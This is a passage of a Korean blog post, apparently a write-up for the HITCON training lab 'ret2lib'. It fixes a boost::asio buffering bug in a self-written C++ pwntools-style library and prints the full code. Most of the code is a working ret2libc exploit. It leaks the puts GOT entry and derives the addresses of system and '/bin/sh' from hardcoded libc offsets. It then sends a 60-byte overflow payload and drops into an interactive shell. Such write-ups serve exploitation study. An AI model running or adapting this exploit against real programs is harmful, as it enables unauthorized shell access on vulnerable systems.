아래는 대상 프로그램을 실행시킨 화면이다. 원래 의도대로라면 recv_until("\n")이 0xf7dad209까지만 읽어야 하지만, 실제 buffer에는 "Leave some message for me :"까지 읽은 상태에서 0xf7dad209까지의 문자열만 반환한 상태이기 때문에, 이 다음의 recv_until(":")에서 무한대기에 걸리는 것이다.
![full](/assets/images/cause.png)

이는 boost::asio가 기본적으로 async로 동작하기 때문이다. 따라서 우리는 recv_until() 함수에 사용하는 buffer를 PROCESS 클래스의 멤버 변수로 변경하여 사용해야 한다.

아래는 수정된 최종 버전의 코드와 그 실행 결과이다.

```cpp
#include <iostream>
#include <mutex>
#include <vector>
#include <unordered_map>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>
#include <boost/algorithm/string.hpp>

#include "elfio/elfio.hpp"
#include "elfio/elf_types.hpp"

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};
    boost::asio::streambuf m_buf;

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

    const std::string recv_line()
    {
        return recv_until("\n");
    }

    const std::string recv_until(const std::string& delim)
    {
        std::string str;
        if(const auto size{boost::asio::read_until(output, m_buf, delim, ec)}; size != 0)
        {
            if(ec && ec != boost::asio::error::eof)
            {
                throw boost::system::system_error(ec);
            }
            std::string data{buffer_to_string(m_buf, m_buf.size())};
            dump_hex(data.c_str(), data.size());

            str += buffer_to_string(m_buf, size);
            m_buf.consume(size);
        }
        locked_output(":::" + buffer_to_string(m_buf, m_buf.size()));
        return str;
    }

    size_t send(const std::string& data)
    {
        const auto length{boost::asio::write(input, boost::asio::buffer(data, data.length()), ec)};
        if(ec && ec != boost::asio::error::eof){throw boost::system::system_error(ec);}
        
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::stringstream stream;
        stream << "0x" << std::hex << length;
        std::cout << std::endl;
        std::cout << "Sent " << std::hex << stream.str() << " bytes:" << std::endl;
        dump_hex(data.c_str(), data.size());
        return length;
    }

    size_t send_line(const std::string& data)
    {
        auto str{data};
        str.append("\n");
        return send(str);
    }

    void interactive()
    {
        locked_output("[*] Switching to interactive mode");
        while(true)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            lock.lock();
            std::cout << "$ ";
            lock.unlock();

            std::string s;
            std::getline(std::cin, s);
            if(s.empty()) continue;
            send_line(s);
            read_at_once();
        }
    }

private:
    void init()
    {
        m_buf.prepare(buffer_length);
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        // read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void dump_hex(const void* data, size_t size)
    {
        char ascii[17] = {0};
        for(size_t i = 0; i < size; ++i)
        {
            printf("%02X ", ((unsigned char*)data)[i]);
            if(((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~')
            {
                ascii[i % 16] = ((unsigned char*)data)[i];
            }
            else
            {
                ascii[i % 16] = '.';
            }
            if((i+1) % 8 == 0 || i+1 == size)
            {
                printf(" ");
                if ((i+1) % 16 == 0)
                {
                    printf("|  %s \n", ascii);
                }
                else if (i+1 == size)
                {
                    ascii[(i+1) % 16] = '\0';
                    if ((i+1) % 16 <= 8)
                    {
                        printf(" ");
                    }
                    for (size_t j = (i+1) % 16; j < 16; ++j)
                    {
                        printf("   ");
                    }
                    printf("|  %s \n", ascii);
                }
            }
        }
        std::cout << std::endl;
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };
    std::unordered_map<std::string, ELFIO::Elf64_Addr> symbols;

public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << "'" << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;

        std::cout << "    RELRO:    " << get_relro() << std::endl;
        std::cout << "    Stack:    " << get_canary() << std::endl;
        std::cout << "    NX:       " << get_nx() << std::endl;
        std::cout << "    PIE:      " << get_pie() << std::endl;
    }

    int got(const std::string& name)
    {
        if(symbols.find(name) != symbols.end())
        {
            return symbols[name];
        }
        return 0;
    }

private:

    std::string get_relro()
    {
        std::string relro{"No RELRO"};

        // search segment headers
        for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
        {
            ELFIO::segment* seg = reader.segments[i];
            if(PT_GNU_RELRO == seg->get_type())
            {
                relro = "Partial RELRO";
                break;
            }
        }

        // search dynamic sections
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_FLAGS == tag && value == DF_BIND_NOW)
                    {
                        relro = "Full RELRO";
                        break;
                    }
                }
            }
        }
        return relro;
    }

    std::string get_canary()
    {
        std::string canary{"No canary found"};

        //
        // canary check
        //
        get_symbols();
        for(const auto& [symbol, addr] : symbols)
        {
            if(symbol.find("__stack_chk_fail") != std::string::npos)
            {
                canary = "Canary found";
                break;
            }
        }
        return canary;
    }

    std::string get_nx()
    {
        std::string nxbit{"NX disabled"};
        for(ELFIO::Elf_Half i = 0; i < reader.segments.size(); ++i)
        {
            ELFIO::segment *seg = reader.segments[i];
            if(PT_GNU_STACK == seg->get_type() && 7 != seg->get_flags())
            {
                nxbit = "NX enabled";
                break;
            }
        }
        return nxbit;
    }

    std::string get_pie()
    {
        std::string pie;

        if(ET_EXEC == reader.get_type()){pie = "No PIE";}
        else {pie = "Not ELF file";}

        // search dynamic sections
        bool find{false};
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                find = true;
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_DEBUG == tag)
                    {
                        if(ET_DYN == reader.get_type())
                        {
                            pie = "PIE enabled";
                        }
                    }
                }
            }
        }
        if(!find)
        {
            if(ET_DYN == reader.get_type())
            {
                pie = "DSO";
            }
        }
        return pie;
    }

    void print_symbols()
    {
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
        for(const auto& [name, addr] : symbols)
        {
            std::stringstream stream;
            stream << name << std::setw(40 - name.length()) << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
            std::cout << stream.str() << std::endl;
        }
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
    }
        
    void get_symbols()
    {
        std::unordered_map<std::string, ELFIO::Elf64_Addr> relocations;
        for(ELFIO::Elf_Half i = 0; i < reader.sections.size(); ++i)
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_SYMTAB == sec->get_type() || SHT_DYNSYM == sec->get_type())
            {
                ELFIO::symbol_section_accessor symbol(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < symbol.get_symbols_num(); ++i)
                {
                    std::string name;
                    ELFIO::Elf64_Addr value{0};
                    ELFIO::Elf_Xword  size{0};
                    unsigned char bind{0};
                    unsigned char type{0};
                    ELFIO::Elf_Half section{0};
                    unsigned char other{0};
                    symbol.get_symbol(i, name, value, size, bind, type, section, other);
                    if(!name.empty())
                    {
                        symbols.emplace(name, value);
                    }
                }
            }
            // add relocation info
            else if(SHT_RELA == sec->get_type() || SHT_REL == sec->get_type())
            {
                ELFIO::relocation_section_accessor reloc(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < reloc.get_entries_num(); ++i)
                {
                    ELFIO::Elf64_Addr offset{0};
                    ELFIO::Elf_Xword info{0};    // index of .dynsym;
                    ELFIO::Elf_Word symbol;
                    ELFIO::Elf_Word type{0};
                    std::string symbolName;
                    reloc.get_entry(i, offset, info, symbol, type, symbolName);
                    relocations.emplace(symbolName, offset);
                }
            }
        }   // end of for

        for(const auto& [name, address] : relocations)
        {
            if(auto it = symbols.find(name); it != symbols.end())
            {
                it->second = relocations[name];
            }
        }
    }
};

const std::string conv_ascii(std::string hex)
{
    std::string ascii{""};
    for(size_t i = 0; i < hex.length(); i += 2)
    {
        const auto part{hex.substr(i, 2)};
        char ch = stoul(part, nullptr, 16);
        ascii += ch;
    }
    return ascii;
}

const std::string p32(const int& number)
{
    const int reversed{boost::endian::endian_reverse(number)};
    return conv_ascii((boost::format("%x") % reversed).str());
}

std::string hex(const int& addr)
{
    std::stringstream stream;
    stream << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
    return stream.str();
}

std::string str(const int& num)
{
    return std::to_string(num);
}

int main()
{
    try
    {
        PROCESS p("/tmp/hitcon/LAB/lab4/ret2lib");
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
        const int puts_got{e.got("puts")};
        std::cout << "[*] found address of puts got : " << hex(puts_got) << std::endl;
        
        std::cout << p.recv_until(":");
        p.send(str(puts_got));
        std::string line{p.recv_line()};    //The content of the address : 0xf7d98290
        
        std::vector<std::string> vec;
        boost::split(vec, line, boost::is_any_of(":"));
        int puts_addr{(int)strtol(boost::algorithm::trim_copy(vec.at(1)).c_str(), NULL, 0)};

        const int sys_offset{0x2be70};
        const int binsh_offset{0x11e0c2};

        const int system_addr{puts_addr - sys_offset};
        const int binsh_addr{puts_addr + binsh_offset};

        std::cout << "[*] address of puts : " << hex(puts_addr) << std::endl;
        std::cout << "[*] address of system : " << hex(system_addr) << std::endl;
        std::cout << "[*] address of /bin/sh string : " << hex(binsh_addr) << std::endl;

        std::string payload;
        for(auto i = 0; i < 60; ++i)
        {
            payload.append("A");
        }
        payload.append(p32(system_addr));
        payload.append("AAAA");
        payload.append(p32(binsh_addr));

        std::cout << p.recv_until(":");
        p.send(payload);
        p.interactive();
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```
![full](/assets/images/last_complete.png)

